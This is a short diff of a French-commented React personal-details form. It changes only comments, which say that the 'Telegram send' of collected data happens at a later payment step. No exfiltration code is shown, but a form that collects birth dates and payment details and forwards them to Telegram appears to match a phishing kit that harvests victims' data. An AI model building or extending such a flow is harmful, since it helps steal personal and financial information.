@@ -1,7 +1,6 @@
 'use client';
 
 import type { FormEvent, FormEventHandler } from 'react';
-// ⛔️ plus d'import sendToTelegram ici
 
 const formatBirthDate: FormEventHandler<HTMLInputElement> = event => {
   const input = event.currentTarget;
@@ -56,7 +55,7 @@ export function PersonalDetailsForm({ initial, onBack, onContinue }: { initial: 
       ville: String(data.get('ville') ?? ''),
     };
 
-    // ⛔️ Plus d'envoi Telegram ici — l'envoi se fait à la dernière étape
+    // Pas d'envoi Telegram ici : l'envoi se fait à la dernière étape (SafePaymentStep)
     onContinue(details);
   }
 
